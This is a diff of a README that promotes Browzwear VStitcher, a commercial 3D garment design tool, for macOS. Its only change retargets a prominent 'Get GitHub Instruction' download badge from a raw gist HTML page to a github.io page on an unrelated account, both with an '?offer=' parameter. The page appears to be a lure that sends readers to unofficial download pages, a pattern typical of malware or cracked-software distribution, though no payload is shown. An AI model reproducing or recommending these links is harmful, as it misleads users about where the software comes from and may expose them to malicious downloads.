@@ -3,7 +3,7 @@
 **Browzwear VStitcher** for **macOS** empowers fashion professionals to create, simulate, and visualize garments in a 3D environment with production-ready precision.  
 It bridges the gap between concept and manufacturing by providing real-time fabric simulation and accurate fit modeling — now fully optimized for **Apple Silicon**. 🍎  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Browzwear%20VStitcher-007AFF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/pugilistmug0/05dda8bf7ffd5dbdc7b2a9f87fadc23a/raw/47badbcd8b17b2c7774d684e9115b02be5e63754/app.html?offer=BrowzwearVStitcherMac)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Browzwear%20VStitcher-007AFF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-app-desk.github.io/.github/?offer=BrowzwearVStitcherMac)
 
 ---
 
